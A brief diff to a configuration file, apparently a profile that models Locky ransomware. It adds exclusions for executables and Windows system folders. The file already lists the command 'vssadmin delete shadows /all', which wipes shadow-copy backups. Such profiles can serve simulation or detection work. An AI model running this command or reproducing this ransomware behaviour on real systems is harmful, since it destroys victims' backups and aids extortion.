@@ -1,4 +1,11 @@
 file_extension: .locky
+exclude:
+  - .exe
+  - .dll
+  - .lnk
+  - .sys
+  - %SYSTEMDRIVE%\Windows
+  - %SYSTEMDRIVE%\ProgramData
 command:
   - vssadmin delete shadows /all
 web_request:
